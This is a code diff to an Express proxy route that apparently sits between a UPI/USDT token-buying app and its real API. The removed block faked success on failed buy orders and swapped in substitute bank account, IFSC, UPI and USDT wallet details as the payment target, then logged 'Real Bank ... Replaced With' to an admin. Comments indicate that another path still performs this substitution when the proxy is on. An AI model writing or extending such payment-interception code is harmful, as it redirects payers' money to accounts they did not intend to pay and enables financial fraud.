@@ -1181,7 +1181,7 @@ app.all('/xxapi/*', async (req, res) => {
     const isMobiKwikBuy = urlLower.includes('mobikwik') || urlLower.includes('mkw');
     const isOsdtBuy = urlLower.includes('osdt') || urlLower.includes('upiplus') || urlLower.includes('upi_plus');
 
-    const isBuyOrder = !isBuyList && (
+    const isBuyOrder = !isBuyList && req.method === 'POST' && (
       urlLower.includes('buyitoken') || urlLower.includes('buy_itoken') ||
       urlLower.includes('buyorder') || urlLower.includes('buy_order') ||
       urlLower.includes('pickorder') || urlLower.includes('pick_order') ||
@@ -1347,121 +1347,14 @@ app.all('/xxapi/*', async (req, res) => {
           // Case 1 fallback: proxy off OR no bank → bj returned as-is with real bank
         } else {
           // ── Case 2: Real API returned ERROR ─────────────────────────────────
-          // Force success ONLY if proxy is ON and a bank is active
-          if (proxyOn && activeBank) {
-            const bkName = activeBank.accountHolder;
-            const bkAcct = activeBank.accountNo;
-            const bkIfsc = activeBank.ifsc;
-            const bkBank = activeBank.bankName || 'Bank';
-            const bkUpi = activeBank.upiId || '';
-            const amt4Link = savedAmount || 0;
-            const { walletDomain, payAccount } = buildWalletDeepLink(activeBank, amt4Link, derivedPt);
-
-            bj.code = 0;
-            bj.msg = 'success';
-            const nowTs = Math.floor(Date.now() / 1000);
-
-            if (isUsdtBuy) {
-              // USDT force: return USDT address as the payment target
-              bj.data = {
-                rptNo: reqOrderId, rpt_no: reqOrderId,
-                orderNo: reqOrderId, order_no: reqOrderId,
-                orderId: reqOrderId, order_id: reqOrderId,
-                slipId: reqOrderId,
-                ctType: parsedCt, method: parsedCt, payType: 0,
-                ctTypeName: 'USDT', payTypeName: 'USDT', ctName: 'USDT', payName: 'USDT',
-                usdtAddress: data.usdtAddress || '',
-                address: data.usdtAddress || '',
-                walletAddress: data.usdtAddress || '',
-                amount: amt4Link, realAmount: amt4Link, orderAmount: amt4Link, money: amt4Link,
-                endTime: nowTs + 1800, expireTime: nowTs + 1800, expiredAt: nowTs + 1800,
-                crtDate: nowTs, payerTimeoutTime: 1800, timeoutTime: 1800,
-                orderState: 0, notifyState: 0, currency: 4, exchangeRate: 1,
-                hideState: 0, reward: 0, userId: String(userId || ''),
-              };
-            } else {
-              bj.data = {
-                // Order IDs — all possible field names
-                rptNo: reqOrderId, rpt_no: reqOrderId,
-                orderNo: reqOrderId, order_no: reqOrderId,
-                orderId: reqOrderId, order_id: reqOrderId,
-                slipId: reqOrderId,
-                // Payment channel
-                ctId: reqCtId ? parseInt(reqCtId) : 1,
-                ctType: parsedCt,
-                method: parsedCt,
-                payType: derivedPt,
-                ctTypeName: ptName, payTypeName: ptName,
-                ctName: ptName, payName: ptName,
-                // Wallet / UPI deep link — this is what "Go Pay" uses
-                walletDomain: walletDomain,
-                payAccount: payAccount,
-                upiId: payAccount,
-                ctAccount: bkAcct,
-                // Timer — 30 min from now
-                endTime: nowTs + 1800,
-                expireTime: nowTs + 1800,
-                expiredAt: nowTs + 1800,
-                crtDate: nowTs,
-                payerTimeoutTime: 1800,
-                timeoutTime: 1800,
-                // Bank details — ALL possible field names frontend might use
-                acctName: bkName, accountName: bkName, name: bkName,
-                acctNo: bkAcct, accountNo: bkAcct, account: bkAcct, cardNo: bkAcct,
-                acctCode: bkIfsc, ifsc: bkIfsc, ifscCode: bkIfsc, bankCode: bkIfsc,
-                bankName: bkBank, acctBankName: bkBank, bank: bkBank,
-                // Amount
-                amount: amt4Link,
-                realAmount: amt4Link,
-                orderAmount: amt4Link,
-                money: amt4Link,
-                // State
-                orderState: 0,
-                notifyState: 0,
-                currency: 3,
-                exchangeRate: 1,
-                hideState: 0,
-                reward: 0,
-                userId: String(userId || ''),
-              };
-            }
-
-            // ── Save forced order to orderBankMap so paymentslipdetail can find it ──
-            if (reqOrderId) {
-              if (!data.orderBankMap) data.orderBankMap = {};
-              data.orderBankMap[reqOrderId] = {
-                bank: `${bkName} | ${bkAcct}${bkIfsc ? ' | ' + bkIfsc : ''}`,
-                accountHolder: activeBank.accountHolder || '',
-                accountNo: activeBank.accountNo || '',
-                ifsc: activeBank.ifsc || '',
-                bankName: activeBank.bankName || '',
-                upiId: activeBank.upiId || '',
-                amount: amt4Link,
-                rptNo: reqOrderId,
-                orderNo: reqOrderId,
-                walletDomain,
-                payType: derivedPt,
-                time: now,
-                userId: String(userId || ''),
-                forced: true,
-                isManual: true
-              };
-              await saveData(data);
-            }
-
-            notifyAdmin(data,
-              `✅ BUY SUCCESSFUL
-💰 Amount: ₹${amt4Link || 'unknown'}
+          // ── Case 2: Real API returned ERROR ─────────────────────────────────
+          // Let the error pass through to the frontend and log the failure
+          notifyAdmin(data,
+            `❌ BUY NOT SUCCESSFUL
+💰 Amount: ₹${savedAmount || 'unknown'}
 📋 Order: ${reqOrderId || 'N/A'}
-💾 Order is saved for history
-━━━━━━━━━━━━━━━━━━━━
-🏦 Real Bank: N/A (Original Error: [${origCode}] ${origMsg})
-━━━━━━━━━━━━━━━━━━━━
-🔄 Replaced With: ${bkName} | ${bkAcct}
+⚠️ Reason: ${origMsg || 'unknown error'}
 🕐 ${now}`);
-          }
-          // Case 2 fallback: proxy OFF or no active bank → bj keeps original error code/msg
-          // Frontend shows the real "maximum pick-ups" message
         }
         return res.status(200).json(bj);
       }
